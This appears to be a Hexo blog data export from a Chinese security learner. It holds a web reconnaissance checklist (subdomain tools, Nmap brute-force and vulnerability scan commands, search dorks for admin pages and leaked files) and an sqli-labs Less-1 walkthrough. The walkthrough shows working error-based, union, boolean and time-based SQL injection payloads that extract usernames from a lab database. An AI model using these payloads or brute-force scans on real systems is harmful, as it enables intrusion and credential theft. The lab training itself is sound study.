{"meta":{"title":"Blad's Blog","subtitle":"一名白帽子的成长之路","description":"菜鸡白帽,SRC无名氏<br>励志成为安全大牛，现在刚迈出第一步","author":"Blad","url":"http://yoursite.com","root":"/"},"pages":[{"title":"文章分类","date":"2019-06-20T13:34:25.000Z","updated":"2019-06-20T13:35:25.443Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-06-20T14:14:40.000Z","updated":"2019-06-20T14:15:00.737Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"信息收集web","slug":"信息收集web","date":"2019-06-24T09:59:54.000Z","updated":"2019-06-24T10:02:17.763Z","comments":true,"path":"2019/06/24/信息收集web/","link":"","permalink":"http://yoursite.com/2019/06/24/信息收集web/","excerpt":"","text":"# 信息收集(Web篇)0x00 子域名收集工具1、子域名挖掘机、lijiejieSubDomain 需要自己维护一套字典才能有很好的效果，你字典越全爆破效果越好。 2、在线子域名收集 https://d.chinacycc.com/ http://z.zcjun.com/ (字典已搞到) https://phpinfo.me/domain/ 3.test404轻量title获取器 4.SSL证书获取子域名 5.获取到域名时，很多是内网域名，但是通过分析其泛解析的ip段还有孤立ip，绑定hosts访问，往往有意想不到的收获，团队某表哥的骚思路。 125.93.80.34 java-test-oppo.wanyol.com 0x01 IP收集/端口收集1、子域名挖掘机layer收集IP 2、其他获取子域名的工具，然后提取IP 3、使用Nmap、Zmap、Masscan进行端口扫描 通过上面的几种方式获取到IP之后，可以把IP提取出来，然后利用Nmap的-iL参数批量扫描 使用Nmap进行可爆破服务扫描 1nmap 目标 --script=ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute 使用Nmap对常见的漏洞扫描并判断 1nmap 目标 --script=auth,vuln Nmap精确判断漏洞并扫描端口 1nmap 目标 --script=dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iis-buffer-overflow,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version 0x02 C段信息收集1、在线c端查询 支持旁站查询等 https://phpinfo.me/bing.php 0x04 搜索语法收集敏感、泄露文件1、搜索引擎语法搜索文件 搜索引擎：baidu.com、bing.com、google.com Site:xxx.com filetype:pdf Site:xxx.com inurl:xxxx 收集一些敏感的文件，类似使用手册、帮助文档。里面可能会有一些路径，偶尔就有未授权访问。特别是帮助文档，有时候目录不会做访问限制，能看到很多东西。 2、查找后台 1site:xxx.xxx adminsite:xxx.xxx login site:xxx.xxx systemsite:xxx.xxx 管理site:xxx.xxx 登录 site:xxx.xxx 内部site:xxx.xxx 系统site:xxx.xxx admin site:xxx.xxx login site:xxx.xxx inner site:xxx.xxx 后台 3、查找指纹、网上已曝光的漏洞指纹 1site:xxxx.com inurl:console 4、查找技巧 某些站测试越权的时候，可能越权参数比较难构造，可以搜一下 http://xxx.xxx.xxx/userinfo/?uid=55498ad290h0sadalksaf 1site:xxx.xxx inurl:uid=5549 0x05 云盘搜索工具1、盘搜搜http://www.pansoso.com/ 2、凌风云https://user.lingfengyun.com 3、盘搜http://www.pansou.com/ …… 0x06 github等托管平台信息收集1、有时间自己搞个github监控 2、sourcegraph是非常专业的代码搜索服务商，他们提供的Sourcegraph Server是免费的代码搜索服务器，通过docker的方式部署，支持无限扩展，支持对GitHub, BitBucket, GitLab等仓库的代码搜索。搜索内容包括仓库代码、diff、commit。 0x07 目录收集1、7kbStorm大佬的目录爆破工具 https://github.com/7kbstorm/7kbscan-WebPathBrute 核心还是自己的字典牛不牛逼。 其实403循环爆破可以爆破到很多未授权访问。 有直接的服务器返回的默认404页面说明能爆破。要是有302跳转的就很难了。 0x08 svn .git 信息泄露1、Githack等扫描工具 2、svn泄露利用工具 0x09 敏感目录泄露1、备份文件泄露常用默认名字： 12345[www.zip](http://www.zip)[www.tar.gz](http://www.tar.gz)[www.rar](http://www.rar) web.zipweb.rar... 2、WEB-INF/web.xml泄露 WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问： 123456/WEB-INF/config/jdbc.properties/WEB-INF/web.xml/WEB-INF/classes//WEB-INF/lib//WEB-INF/src//WEB-INF/database.propertiesbzr泄露 通过它我们可以看项目历史：http://xxx.xxx.xxx/.bzr/ 3、spring框架信息泄露 一下目录均是默认开启的 1[&quot;autoconfig&quot;,&quot;configprops&quot;,&quot;beans&quot;,&quot;dump&quot;,&quot;env&quot;,&quot;health&quot;,&quot;info&quot;,&quot;mappings&quot;,&quot;metrics&quot;,&quot;trace&quot;] 有的框架还会开启心跳检查(应用监控)，访问http://xxx.com/actuator即可 详情学习这篇：https://xz.aliyun.com/t/2233 0x10 shodan、fofa收集信息0x11 相关链接1.浅谈信息收集 https://www.t00ls.net/thread-51445-1-1.html https://www.freebuf.com/articles/web/117006.html https://mp.weixin.qq.com/s/pprqACosIunwtN-u7qd6rg","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"},{"name":"信息安全","slug":"信息安全","permalink":"http://yoursite.com/tags/信息安全/"}]},{"title":"sqli-labs_less_1","slug":"sqli-labs-less-1","date":"2019-06-20T14:27:20.000Z","updated":"2019-06-20T14:41:57.263Z","comments":true,"path":"2019/06/20/sqli-labs-less-1/","link":"","permalink":"http://yoursite.com/2019/06/20/sqli-labs-less-1/","excerpt":"方法一：报错注入extractvalue()判断注入点：输入单引号，发现页面报错 http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; 闭合前一个单引号，注释掉后一个，并加入判断payloadhttp://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=1--+ 所以利用extractvalue()报错注入先判断函数是否可执行http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,md5(123));--+","text":"方法一：报错注入extractvalue()判断注入点：输入单引号，发现页面报错 http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; 闭合前一个单引号，注释掉后一个，并加入判断payloadhttp://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=1--+ 所以利用extractvalue()报错注入先判断函数是否可执行http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,md5(123));--+ 获取version()、database()、user()等信息http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,concat(0x7e,database()));--+ 获取表名：http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)));--+ 获取users的列名http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1)));--+ 获取每列（id、username、password）的内容http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,concat(0x7e,(select username from security.users limit 0,1)));--+ 方法二：联合注入判断注入点：输入单引号，发现页面报错 http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; order by 判断有几列http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; order by 3--+union select 联合注入http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 11,22,33--+ 判断数据库名称：http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 11,database(),33--+ 获取security的表名：http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 11,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)),33--+ 获取列名：http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 11,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 1,1)),33--+ 获取每列（id、username、password）的内容：http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 11,concat(0x7e,(select username from security.users limit 1,1)),33--+ 方法3：回显布尔注入(ascii逐位判断)判断注入点：输入单引号，发现页面报错 http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=1--+获取数据库名：利用ascii逐位判断，更改substr()第二参数1~nhttp://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and ascii(substr(database(),1,1))=115--+获取表名(emails\\referers\\uagents\\users)：http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=101--+获取users列名：http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1))=105--+获取每列（id、username、password）的内容http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and ascii(substr((select username from security.users limit 0,1),1,1))&gt;65--+ 方法4：时间盲注(sleep()、if())if（（条件），m，n）语句：若条件为真 返回m，若条件为假 返回n；获取数据库名：http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and sleep(if((ascii(substr(database(),1,1))=115),5,0))--+","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"http://yoursite.com/categories/sqli-labs/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yoursite.com/tags/SQL注入/"},{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]}]}